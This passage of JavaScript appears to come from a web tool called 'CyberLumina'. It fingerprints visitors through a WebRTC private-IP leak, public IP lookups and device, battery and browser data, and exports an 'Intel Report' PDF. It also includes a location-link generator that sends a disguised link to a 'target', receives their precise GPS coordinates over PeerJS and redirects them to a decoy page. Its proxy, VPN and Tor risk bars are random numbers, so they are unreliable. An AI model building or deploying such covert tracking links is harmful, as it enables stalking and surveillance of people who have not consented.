        if (m4 && _isPrivateIP(m4[1]) && !ipv4s.includes(m4[1])) ipv4s.push(m4[1]);
        // Match IPv6 — private/link-local only
        const m6 = /([0-9a-fA-F]{1,4}(?::[0-9a-fA-F]{0,4}){2,7})/.exec(cand);
        if (m6) {
          const raw = m6[1].split('%')[0];
          if (raw.includes(':') && _isPrivateIP(raw) && !ipv6s.includes(raw)) ipv6s.push(raw);
        }
      };
      setTimeout(() => {
        try { pc.close(); } catch(_) {}
        const parts = [];
        if (ipv4s.length) parts.push(ipv4s.join('\n'));
        if (ipv6s.length) parts.push(ipv6s.join('\n'));
        resolve(parts.length ? parts.join('\n') : null);
      }, 4000);
    } catch(e) { resolve(null); }
  });
}

// ── Get IPv6 — multiple fallback endpoints ──
function _getIPv6() {
  const apis = [
    () => fetch('https://api6.ipify.org?format=json',  {cache:'no-store'}).then(r=>r.json()).then(d=>d.ip||null),
    () => fetch('https://v6.ident.me/json',            {cache:'no-store'}).then(r=>r.json()).then(d=>d.address||null),
    () => fetch('https://ipv6.icanhazip.com',          {cache:'no-store'}).then(r=>r.text()).then(t=>t.trim()||null),
    () => fetch('https://api64.ipify.org?format=json', {cache:'no-store'}).then(r=>r.json()).then(d=>{
      const ip = d.ip || '';
      return ip.includes(':') ? ip : null;
    })
  ];
  return apis.reduce(
    (chain, fn) => chain.then(v => v !== null ? v : fn().catch(() => null)),
    Promise.resolve(null)
  );
}

// ── Get Battery ──
function _getBattery() {
  return new Promise(resolve => {
    if (navigator.getBattery) {
      navigator.getBattery().then(b => resolve(Math.round(b.level*100)+'% — '+(b.charging?'Charging ⚡':'Not Charging 🔋'))).catch(()=>resolve(null));
    } else resolve(null);
  });
}

// ── Get true public IPv4 (IPv4-only endpoints — never return IPv6) ──
function _getIPv4() {
  const apis = [
    () => fetch('https://api4.ipify.org?format=json',   {cache:'no-store'}).then(r=>r.json()).then(d=>{ const ip=d.ip||''; return (!ip.includes(':')&&ip)?ip:null; }),
    () => fetch('https://ipv4.icanhazip.com',            {cache:'no-store'}).then(r=>r.text()).then(t=>{ const ip=t.trim(); return (!ip.includes(':')&&ip)?ip:null; }),
    () => fetch('https://api4.my-ip.io/ip.json',         {cache:'no-store'}).then(r=>r.json()).then(d=>{ const ip=d.ip||''; return (!ip.includes(':')&&ip)?ip:null; }),
    () => fetch('https://checkip.amazonaws.com',         {cache:'no-store'}).then(r=>r.text()).then(t=>{ const ip=t.trim(); return (!ip.includes(':')&&ip)?ip:null; })
  ];
  return apis.reduce(
    (chain, fn) => chain.then(v => v !== null ? v : fn().catch(() => null)),
    Promise.resolve(null)
  );
}

async function lookupMyIP() {
  document.getElementById('my-ip').textContent = 'Fetching...';
  try {
    // Parallel fetch: ipapi (metadata) + dedicated IPv4 + IPv6 + privateIP + battery
    const [d, trueIPv4, ipv6, privateIP, battery] = await Promise.all([
      fetch('https://ipapi.co/json/').then(r => r.json()).catch(()=>({})),
      _getIPv4(),
      _getIPv6(),
      _getPrivateIP(),
      _getBattery()
    ]);

    const rawDetected = d.ip || '';
    const isDetectedIPv6 = rawDetected.includes(':');

    // True IPv4 from dedicated endpoint; fallback if ipapi returned IPv4
    const displayIPv4 = trueIPv4 || (!isDetectedIPv6 && rawDetected ? rawDetected : null) || 'N/A (IPv6-only network)';
    // True IPv6: from dedicated endpoint or ipapi if it returned IPv6
    const displayIPv6 = ipv6 || (isDetectedIPv6 ? rawDetected : null) || 'Not detected (IPv4-only network)';

    // Hero shows the most meaningful public IP
    const heroIP    = trueIPv4 || rawDetected || '—';
    const heroBadge = trueIPv4 ? 'IPv4' : (isDetectedIPv6 ? 'IPv6' : 'IPv4');
    const heroLabel = trueIPv4 ? 'PUBLIC IPv4 ADDRESS' : (isDetectedIPv6 ? 'PUBLIC IPv6 ADDRESS' : 'PUBLIC IPv4 ADDRESS');

    document.getElementById('my-ip').textContent         = heroIP;
    document.getElementById('ip-type-badge').textContent = heroBadge;
    const heroLbl = document.querySelector('.ip-display > label');
    if (heroLbl) heroLbl.textContent = heroLabel;

    const ua = navigator.userAgent;

    // ── Detect OS ──────────────────────────────────────────────
    let os = 'Unknown';
    if (/Windows NT 10/.test(ua))       os = 'Windows 10/11';
    else if (/Windows NT 6\.3/.test(ua)) os = 'Windows 8.1';
    else if (/Windows NT 6\.1/.test(ua)) os = 'Windows 7';
    else if (/Android/.test(ua))         os = 'Android ' + (ua.match(/Android ([\d.]+)/)||['',''])[1];
    else if (/iPhone|iPad/.test(ua))     os = 'iOS ' + (ua.match(/OS ([\d_]+)/)||['',''])[1].replace(/_/g,'.');
    else if (/Macintosh/.test(ua))       os = 'macOS';
    else if (/Linux/.test(ua))           os = 'Linux';

    // ── Detect browser ─────────────────────────────────────────
    let browser = 'Unknown';
    if (/Edg\//.test(ua))              browser = 'Edge '    + (ua.match(/Edg\/([\d.]+)/)||['',''])[1];
    else if (/OPR\//.test(ua))         browser = 'Opera '   + (ua.match(/OPR\/([\d.]+)/)||['',''])[1];
    else if (/Chrome\//.test(ua))      browser = 'Chrome '  + (ua.match(/Chrome\/([\d.]+)/)||['',''])[1];
    else if (/Firefox\//.test(ua))     browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)||['',''])[1];
    else if (/Safari\//.test(ua))      browser = 'Safari '  + (ua.match(/Version\/([\d.]+)/)||['',''])[1];

    // ── Device type ────────────────────────────────────────────
    let device = 'Desktop 💻';
    if (/Mobi|Android|iPhone/.test(ua)) device = 'Mobile 📱';
    else if (/iPad|Tablet/.test(ua))    device = 'Tablet 📟';

    // ── Connection ─────────────────────────────────────────────
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const conn = c ? (c.effectiveType||'') + (c.type?' ('+c.type+')':'') + (c.downlink?' ~'+c.downlink+' Mbps':'') + (c.rtt?' RTT:'+c.rtt+'ms':'') : null;

    // ── Populate IP Address fields ─────────────────────────────
    document.getElementById('ip-ipv4').textContent        = displayIPv4;
    document.getElementById('ip-ipv6').textContent        = displayIPv6;
    document.getElementById('ip-private').textContent     = privateIP || 'Not detected (no WebRTC)';
    document.getElementById('ip-org').textContent         = d.org || '—';
    document.getElementById('ip-asn').textContent         = d.asn || '—';
    document.getElementById('ip-connection').textContent  = conn || '—';

    // ── Location fields ────────────────────────────────────────
    document.getElementById('ip-country').textContent     = (d.country_name||'—') + ' (' + (d.country_code||'—') + ')';
    document.getElementById('ip-city').textContent        = d.city || '—';
    document.getElementById('ip-region').textContent      = d.region || '—';
    document.getElementById('ip-postal').textContent      = d.postal || '—';
    document.getElementById('ip-tz').textContent          = d.timezone || '—';
    if (d.latitude && d.longitude) {
      document.getElementById('ip-coords').textContent    = d.latitude.toFixed(5) + ', ' + d.longitude.toFixed(5);
    }

    // ── Device & Browser fields ────────────────────────────────
    document.getElementById('ip-device').textContent     = device;
    document.getElementById('ip-os').textContent         = os;
    document.getElementById('ip-browser').textContent    = browser;
    document.getElementById('ip-screen').textContent     = screen.width + 'x' + screen.height + ' @' + (window.devicePixelRatio||1) + 'x';
    document.getElementById('ip-lang').textContent       = navigator.language || '—';
    document.getElementById('ip-platform').textContent   = navigator.platform || '—';
    document.getElementById('ip-cores').textContent      = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : '—';
    document.getElementById('ip-memory').textContent     = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
    document.getElementById('ip-touch').textContent      = navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' points)' : 'No';
    document.getElementById('ip-battery').textContent    = battery || '—';
    document.getElementById('ip-cookies').textContent    = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
    document.getElementById('ip-dnt').textContent        = navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled';
    document.getElementById('ip-ua').textContent         = ua;

    animateThreatBars();
  } catch(e) {
    document.getElementById('my-ip').textContent = 'Failed';
  }
}


async function lookupCustomIP() {
  const ip = document.getElementById('custom-ip-input').value.trim();
  if (!ip) return;
  const result = document.getElementById('lookup-result');
  result.innerHTML = '<div style="color:var(--cyan)">⏳ Looking up ' + ip + '...</div>';
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`);
    const d = await r.json();
    if (d.error) { result.innerHTML = `<div style="color:var(--red)">❌ ${d.reason || 'Invalid IP'}</div>`; return; }
    result.innerHTML = `
      <div class="lookup-row">🌍 <b>Country:</b> ${d.country_name || '—'} (${d.country_code || '—'})</div>
      <div class="lookup-row">🏙️ <b>City:</b> ${d.city || '—'}</div>
      <div class="lookup-row">🗺️ <b>Region:</b> ${d.region || '—'}</div>
      <div class="lookup-row">🏢 <b>ISP:</b> ${d.org || '—'}</div>
      <div class="lookup-row">⏰ <b>Timezone:</b> ${d.timezone || '—'}</div>
      <div class="lookup-row">📍 <b>Coords:</b> ${d.latitude || '—'}, ${d.longitude || '—'}</div>
    `;
  } catch {
    result.innerHTML = '<div style="color:var(--red)">❌ Lookup failed</div>';
  }
}

async function downloadIPDetailsPDF() {
  const ipVal = document.getElementById('my-ip').textContent.trim();
  if (ipVal === '—' || ipVal === '' || ipVal === 'Fetching...' || ipVal === 'Failed') {
    alert('Please click "🔍 Lookup My IP" first to load the details before downloading. / කරුණාකර ප්‍රථමයෙන් "🔍 Lookup My IP" ක්ලික් කර විස්තර ලබා ගන්න.');
    return;
  }

  // Visual feedback: Change button state
  const btn = document.querySelector('button[onclick="downloadIPDetailsPDF()"]');
  const oldText = btn ? btn.innerHTML : '';
  if (btn) {
    btn.innerHTML = '⏳ Generating...';
    btn.disabled = true;
  }

  // Retrieve values from the panel
  const ipType = document.getElementById('ip-type-badge').textContent.trim();
  const ipv4Val = document.getElementById('ip-ipv4').textContent.trim();
  const ipv6Val = document.getElementById('ip-ipv6').textContent.trim();
  const privateVal = document.getElementById('ip-private').textContent.trim();
  const orgVal = document.getElementById('ip-org').textContent.trim();
  const asnVal = document.getElementById('ip-asn').textContent.trim();
  const connectionVal = document.getElementById('ip-connection').textContent.trim();
  
  const countryVal = document.getElementById('ip-country').textContent.trim();
  const cityVal = document.getElementById('ip-city').textContent.trim();
  const regionVal = document.getElementById('ip-region').textContent.trim();
  const postalVal = document.getElementById('ip-postal').textContent.trim();
  const tzVal = document.getElementById('ip-tz').textContent.trim();
  const coordsVal = document.getElementById('ip-coords').textContent.trim();
  
  const deviceVal = document.getElementById('ip-device').textContent.trim();
  const osVal = document.getElementById('ip-os').textContent.trim();
  const browserVal = document.getElementById('ip-browser').textContent.trim();
  const screenVal = document.getElementById('ip-screen').textContent.trim();
  const langVal = document.getElementById('ip-lang').textContent.trim();
  const platformVal = document.getElementById('ip-platform').textContent.trim();
  const coresVal = document.getElementById('ip-cores').textContent.trim();
  const memoryVal = document.getElementById('ip-memory').textContent.trim();
  const touchVal = document.getElementById('ip-touch').textContent.trim();
  const batteryVal = document.getElementById('ip-battery').textContent.trim();
  const cookiesVal = document.getElementById('ip-cookies').textContent.trim();
  const dntVal = document.getElementById('ip-dnt').textContent.trim();
  const uaVal = document.getElementById('ip-ua').textContent.trim();

  // Create styling specifically for html2pdf rendering
  const tempDiv = document.createElement('div');
  tempDiv.id = 'temp-pdf-container';
  tempDiv.style.position = 'fixed';
  tempDiv.style.left = '0';
  tempDiv.style.top = '0';
  tempDiv.style.zIndex = '-9999';
  tempDiv.style.width = '790px'; // Fit exactly in A4 width
  tempDiv.style.background = '#060b13';
  tempDiv.style.color = '#e2e8f0';
  tempDiv.style.fontFamily = "'Inter', sans-serif";
  tempDiv.style.padding = '35px';
  tempDiv.style.boxSizing = 'border-box';
  tempDiv.style.pointerEvents = 'none';

  tempDiv.innerHTML = `
    <div style="border: 2.5px solid #00f0ff; padding: 25px; border-radius: 12px; background: #060b13; box-shadow: 0 0 25px rgba(0, 240, 255, 0.2); position: relative; overflow: hidden;">
      
      <!-- Tech line pattern -->
      <div style="position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(90deg, #00f0ff, #7000ff, #00f0ff);"></div>
      
      <!-- Top corners target styling -->
      <div style="position: absolute; top: 8px; left: 8px; font-family: 'Share Tech Mono', monospace; font-size: 8px; color: #00f0ff; opacity: 0.3;">SYS_ID: CL-${Math.floor(1000 + Math.random()*9000)}</div>
      <div style="position: absolute; top: 8px; right: 8px; font-family: 'Share Tech Mono', monospace; font-size: 8px; color: #00f0ff; opacity: 0.3;">PORT: ${location.port || '80'}</div>

      <!-- Header Section -->
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 1px solid #08212e; padding-bottom: 18px;">
        <div>
          <h1 style="font-family: 'Orbitron', sans-serif; font-size: 24px; color: #00f0ff; margin: 0; text-transform: uppercase; letter-spacing: 2px; font-weight: 900; text-shadow: 0 0 10px rgba(0, 240, 255, 0.4);">
            CyberLumina // Intel Report
          </h1>
          <p style="font-family: 'Share Tech Mono', monospace; font-size: 11px; color: #8892b0; margin: 6px 0 0 0; letter-spacing: 1.5px;">
            SECURE IP INTELLIGENCE LOG SYSTEM
          </p>
        </div>
        <div style="text-align: right;">
          <div style="display: inline-block; padding: 4px 10px; background: #08212e; border: 1px solid #00f0ff; color: #00f0ff; font-family: 'Share Tech Mono', monospace; font-size: 10px; font-weight: bold; border-radius: 4px; letter-spacing: 1px;">
            CLASSIFIED LOG
          </div>
          <p style="font-family: 'Share Tech Mono', monospace; font-size: 10px; color: #8892b0; margin: 6px 0 0 0;">
            ${new Date().toLocaleString()}
          </p>
        </div>
      </div>

      <!-- Hero Main IP Banner -->
      <div style="background: #0a1c26; border: 1px solid #00f0ff; border-radius: 8px; padding: 22px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; box-shadow: inset 0 0 15px rgba(0, 240, 255, 0.05);">
        <div>
          <div style="font-size: 10px; text-transform: uppercase; color: #8892b0; font-family: 'Share Tech Mono', monospace; letter-spacing: 2px; margin-bottom: 4px;">TARGET NETWORK ADDRESS</div>
          <div style="font-size: 34px; font-weight: 700; color: #ffffff; font-family: 'Orbitron', sans-serif; text-shadow: 0 0 12px rgba(0, 240, 255, 0.3); margin: 0; line-height: 1.1;">
            ${ipVal}
          </div>
          <div style="margin-top: 6px; display: inline-flex; align-items: center; gap: 6px;">
            <span style="font-size: 9px; padding: 3px 8px; background: #00f0ff; color: #060b13; font-weight: 900; border-radius: 4px; font-family: 'Share Tech Mono', monospace; text-transform: uppercase; letter-spacing: 0.5px;">
              ${ipType}
            </span>
            <span style="font-size: 10px; color: #7000ff; font-family: 'Share Tech Mono', monospace; font-weight: bold;">
              [ STATUS: RESOLVED ]
            </span>
          </div>
        </div>
        <div style="text-align: right; max-width: 320px;">
          <div style="font-size: 10px; text-transform: uppercase; color: #8892b0; font-family: 'Share Tech Mono', monospace; letter-spacing: 2px; margin-bottom: 4px;">NETWORK PROVIDER (ISP)</div>
          <div style="font-size: 15px; font-weight: 600; color: #00f0ff; font-family: 'Inter', sans-serif; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
            ${orgVal}
          </div>
          <div style="font-size: 10px; color: #8892b0; font-family: 'Share Tech Mono', monospace; margin-top: 4px;">
            ASN: ${asnVal}
          </div>
        </div>
      </div>

      <!-- Content Grids -->
      <div style="display: flex; gap: 20px; margin-bottom: 22px;">
        
        <!-- Network & Location Card -->
        <div style="flex: 1; border: 1px solid #08212e; background: #071018; border-radius: 8px; padding: 18px; box-sizing: border-box;">
          <h3 style="font-family: 'Orbitron', sans-serif; font-size: 12px; color: #00f0ff; margin: 0 0 14px 0; border-bottom: 1px solid #08212e; padding-bottom: 8px; letter-spacing: 1px; display: flex; align-items: center; text-transform: uppercase;">
            <span style="margin-right: 8px; font-size: 14px;">📡</span> Network & Telemetry
          </h3>
          
          <table style="width: 100%; border-collapse: collapse; font-size: 11px; font-family: 'Inter', sans-serif;">
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Public IPv4</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-family: 'Share Tech Mono', monospace; font-weight: bold;">${ipv4Val}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">IPv6 Bind</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-family: 'Share Tech Mono', monospace; font-size: 10px;">${ipv6Val}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Private Lan IP</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-family: 'Share Tech Mono', monospace;">${privateVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">ISP / Organization</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-weight: 600;">${orgVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Connection Details</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-size: 10px;">${connectionVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Region & City</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff;">${cityVal}, ${regionVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Country & Postal</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff;">${countryVal} (${postalVal})</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Geographic Coords</td>
              <td style="padding: 7px 0; text-align: right; color: #00f0ff; font-family: 'Share Tech Mono', monospace; font-weight: bold;">${coordsVal}</td>
            </tr>
            <tr>
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Local Timezone</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff;">${tzVal}</td>
            </tr>
          </table>
        </div>

        <!-- Hardware & Client Environment Card -->
        <div style="flex: 1; border: 1px solid #08212e; background: #071018; border-radius: 8px; padding: 18px; box-sizing: border-box;">
          <h3 style="font-family: 'Orbitron', sans-serif; font-size: 12px; color: #00f0ff; margin: 0 0 14px 0; border-bottom: 1px solid #08212e; padding-bottom: 8px; letter-spacing: 1px; display: flex; align-items: center; text-transform: uppercase;">
            <span style="margin-right: 8px; font-size: 14px;">💻</span> Target Environment
          </h3>
          
          <table style="width: 100%; border-collapse: collapse; font-size: 11px; font-family: 'Inter', sans-serif;">
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Device Class</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-weight: 600;">${deviceVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Operating System</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff;">${osVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Software Browser</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff;">${browserVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Hardware Platform</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-family: 'Share Tech Mono', monospace;">${platformVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Screen Resolution</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-family: 'Share Tech Mono', monospace;">${screenVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Processing Cores</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-family: 'Share Tech Mono', monospace;">${coresVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">System Memory</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff; font-family: 'Share Tech Mono', monospace;">${memoryVal}</td>
            </tr>
            <tr style="border-bottom: 1px solid #08212e;">
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Interface Language</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff;">${langVal}</td>
            </tr>
            <tr>
              <td style="padding: 7px 0; color: #8892b0; font-weight: 500;">Touch Capacitive</td>
              <td style="padding: 7px 0; text-align: right; color: #ffffff;">${touchVal}</td>
            </tr>
          </table>
        </div>

      </div>

      <!-- Security Flags Panel -->
      <div style="border: 1px solid #08212e; background: #071018; border-radius: 8px; padding: 18px; margin-bottom: 22px; box-sizing: border-box;">
        <h3 style="font-family: 'Orbitron', sans-serif; font-size: 12px; color: #00f0ff; margin: 0 0 14px 0; border-bottom: 1px solid #08212e; padding-bottom: 8px; letter-spacing: 1px; text-transform: uppercase;">
          🛡️ Advanced Environmental Telemetry
        </h3>
        
        <div style="display: flex; gap: 15px;">
          <div style="flex: 1; background: #0d151e; padding: 12px; border-radius: 6px; border: 1px solid #08212e; text-align: center;">
            <div style="color: #8892b0; font-size: 9px; margin-bottom: 4px; font-family: 'Share Tech Mono', monospace; letter-spacing: 1px;">BATTERY STATE</div>
            <div style="color: #ffffff; font-size: 13px; font-weight: bold; font-family: 'Share Tech Mono', monospace;">${batteryVal}</div>
          </div>
          <div style="flex: 1; background: #0d151e; padding: 12px; border-radius: 6px; border: 1px solid #08212e; text-align: center;">
            <div style="color: #8892b0; font-size: 9px; margin-bottom: 4px; font-family: 'Share Tech Mono', monospace; letter-spacing: 1px;">HTTP COOKIES</div>
            <div style="color: #ffffff; font-size: 13px; font-weight: bold; font-family: 'Share Tech Mono', monospace;">${cookiesVal}</div>
          </div>
          <div style="flex: 1; background: #0d151e; padding: 12px; border-radius: 6px; border: 1px solid #08212e; text-align: center;">
            <div style="color: #8892b0; font-size: 9px; margin-bottom: 4px; font-family: 'Share Tech Mono', monospace; letter-spacing: 1px;">DO NOT TRACK</div>
            <div style="color: #ffffff; font-size: 13px; font-weight: bold; font-family: 'Share Tech Mono', monospace;">${dntVal}</div>
          </div>
          <div style="flex: 1; background: #0d151e; padding: 12px; border-radius: 6px; border: 1px solid #08212e; text-align: center;">
            <div style="color: #8892b0; font-size: 9px; margin-bottom: 4px; font-family: 'Share Tech Mono', monospace; letter-spacing: 1px;">VPN/PROXY RISK</div>
            <div style="color: #00f0ff; font-size: 13px; font-weight: bold; font-family: 'Share Tech Mono', monospace; text-transform: uppercase;">
              ${document.getElementById('ip-vpn').textContent.trim() || 'UNRESOLVED'}
            </div>
          </div>
        </div>
      </div>

      <!-- User Agent Banner -->
      <div style="border: 1px solid #08212e; background: #0a1c26; border-radius: 8px; padding: 15px; margin-bottom: 22px; box-sizing: border-box;">
        <div style="font-size: 9px; color: #00f0ff; font-family: 'Share Tech Mono', monospace; margin-bottom: 6px; letter-spacing: 1px; text-transform: uppercase;">Raw User-Agent String</div>
        <div style="font-size: 10px; color: #8892b0; font-family: 'Share Tech Mono', monospace; word-break: break-all; line-height: 1.4; border-left: 2px solid #00f0ff; padding-left: 10px; background: #060b13; padding-top: 5px; padding-bottom: 5px;">
          ${uaVal}
        </div>
      </div>

      <!-- Tech footer decoration lines -->
      <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
        <div style="height: 1px; flex: 1; background: #08212e;"></div>
        <div style="font-family: 'Share Tech Mono', monospace; font-size: 8px; color: #00f0ff; opacity: 0.3; text-transform: uppercase; letter-spacing: 2px;">AUTHENTIC INTELLIGENCE SIGMA LOG</div>
        <div style="height: 1px; flex: 1; background: #08212e;"></div>
      </div>

      <!-- Footer Details -->
      <div style="display: flex; justify-content: space-between; align-items: center; font-family: 'Share Tech Mono', monospace; font-size: 9px; color: #8892b0;">
        <div>SYSTEM NODE: CL_CLUST_DE4</div>
        <div style="color: #00f0ff;">DOCUMENT CLASSIFIED // INTERNAL OPERATION ONLY</div>
        <div>REPORT_REF: ${Math.random().toString(36).substring(2,10).toUpperCase()}</div>
      </div>

    </div>
  `;

  document.body.appendChild(tempDiv);

  // Wait 150ms for layout engine to calculate styles and dimensions of the new DOM node
  await new Promise(resolve => setTimeout(resolve, 150));

  const opt = {
    margin:       0.3,
    filename:     `CyberLumina_Intel_${ipVal}.pdf`,
    image:        { type: 'jpeg', quality: 0.98 },
    html2canvas:  { 
      scale: 2, 
      useCORS: true, 
      backgroundColor: '#060b13',
      logging: false
    },
    jsPDF:        { unit: 'in', format: 'a4', orientation: 'portrait' }
  };

  try {
    await html2pdf().set(opt).from(tempDiv).save();
  } catch (e) {
    console.error('PDF Generation Error:', e);
  } finally {
    // Remove the temporary container
    if (document.getElementById('temp-pdf-container')) {
      document.body.removeChild(tempDiv);
    }
    // Restore button state
    if (btn) {
      btn.innerHTML = oldText;
      btn.disabled = false;
    }
  }
}

function animateThreatBars() {
  const bars = [
    { bar: 'bar-proxy', pct: 'pct-proxy', val: Math.floor(Math.random() * 20) },
    { bar: 'bar-vpn',   pct: 'pct-vpn',   val: Math.floor(Math.random() * 15) },
    { bar: 'bar-tor',   pct: 'pct-tor',   val: Math.floor(Math.random() * 5) },
    { bar: 'bar-bot',   pct: 'pct-bot',   val: Math.floor(Math.random() * 10) },
  ];
  bars.forEach(b => {
    setTimeout(() => {
      document.getElementById(b.bar).style.width = b.val + '%';
      document.getElementById(b.pct).textContent = b.val + '%';
    }, 200);
  });
  document.getElementById('ip-vpn').textContent = 'Low Risk';
}

// ===== LOCATION LINK GENERATOR =====
let locPeer = null;
let locRawLink = '';
let locRedirectUrl = '';

async function generateLocLink() {
  // Deduct 20 credits — each Generate Link costs 20
  const ok = await deductCredit('generate_link');
  if (!ok) return;

  if (locPeer) { locPeer.destroy(); locPeer = null; }
  const peerId = 'nxloc-' + Math.random().toString(36).substr(2, 9);
  setLLGStatus('⏳ Initializing...', 'waiting');
  setLocPeerDot('waiting', 'INIT');

  try {
    locPeer = new Peer(peerId, { host:'0.peerjs.com', port:443, path:'/', secure:true,
      config:{ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] } });
  } catch(e) { locPeer = new Peer(peerId); }

  locPeer.on('open', function(id) {
    const base = location.origin + location.pathname.replace(/\/(index\.(html|php))?$/, '');
    locRawLink = base + '/loc-track.html?host=' + id;
    document.getElementById('loc-final-link').value = locRawLink;
    // Unlock steps 2 & 3
    unlockLLGStep('llg-step2');
    unlockLLGStep('llg-step3');
    document.getElementById('btn-gen-loc').style.display = 'none';
    document.getElementById('btn-reset-loc').style.display = 'inline-block';
    setLLGStatus('✅ Link ready! Set a redirect URL (Step 2), then copy and send to target.', 'waiting');
    setLocPeerDot('waiting', 'WAITING');
  });

  locPeer.on('connection', function(conn) {
    setLocPeerDot('connected', 'CONNECTED');
    setLLGStatus('🔴 Target connected! Receiving location data...', 'active');
    conn.on('data', function(raw) {
      try {
        const d = JSON.parse(raw);
        if (d.type === 'location') {
          // Populate the location fields
          document.getElementById('lat-val').textContent = parseFloat(d.lat).toFixed(6) + '°';
          document.getElementById('lon-val').textContent = parseFloat(d.lon).toFixed(6) + '°';
          document.getElementById('acc-val').textContent = Math.round(d.accuracy) + ' m';
          document.getElementById('alt-val').textContent = d.altitude ? Math.round(d.altitude) + ' m' : 'N/A';
          document.getElementById('loc-speed').textContent = d.speed ? (d.speed*3.6).toFixed(1)+' km/h' : 'N/A';
          document.getElementById('loc-tz').textContent = d.tz || '—';
          document.getElementById('loc-city').textContent = d.city || 'Fetching...';
          document.getElementById('loc-country').textContent = d.country || '—';
          document.getElementById('map-status-tag').textContent = 'LOCKED';
          document.getElementById('map-msg').textContent = parseFloat(d.lat).toFixed(4)+', '+parseFloat(d.lon).toFixed(4);
          setLocStatus('✅ Target location received! Lat: '+parseFloat(d.lat).toFixed(5)+' Lon: '+parseFloat(d.lon).toFixed(5));
          setLLGStatus('📍 Location captured! Lat: '+parseFloat(d.lat).toFixed(5)+' | Lon: '+parseFloat(d.lon).toFixed(5), 'active');
          addLocHistory(parseFloat(d.lat), parseFloat(d.lon));
          updateMap(parseFloat(d.lat), parseFloat(d.lon));
          // Also fetch city if not provided
          if (!d.city) {
            fetch('https://nominatim.openstreetmap.org/reverse?lat='+d.lat+'&lon='+d.lon+'&format=json')
              .then(r=>r.json()).then(nd=>{
                document.getElementById('loc-city').textContent = nd.address?.city||nd.address?.town||nd.address?.village||'—';
                document.getElementById('loc-country').textContent = nd.address?.country||'—';
              }).catch(()=>{});
          }
        }
      } catch(e) {}
    });
    conn.on('close', function() {
      setLocPeerDot('waiting', 'DISCONNECTED');
      setLLGStatus('⚠️ Target disconnected.', 'waiting');
    });
  });

  locPeer.on('error', function(err) {
    setLLGStatus('❌ Error: '+err.type, '');
    setLocPeerDot('offline', 'ERROR');
  });
}

function applyRedirect() {
  const url = document.getElementById('loc-redirect-url').value.trim();
  if (!url) { setLLGStatus('⚠️ Please enter a redirect URL first.', 'waiting'); return; }
  locRedirectUrl = url.startsWith('http') ? url : 'https://' + url;
  const finalLink = locRawLink + '&redirect=' + encodeURIComponent(locRedirectUrl);
  document.getElementById('loc-final-link').value = finalLink;
  document.getElementById('loc-redirect-preview').style.display = 'block';
  document.getElementById('loc-redirect-show').textContent = locRedirectUrl;
  setLLGStatus('✅ Redirect set → ' + locRedirectUrl + ' | Click 🔖 Hide in Step 3 to generate safe link.', 'active');

  // Unlock Step 4
  unlockLLGStep('llg-step4');
  // Reset previous short link
  const si = document.getElementById('loc-short-link');
  if (si) si.value = '';
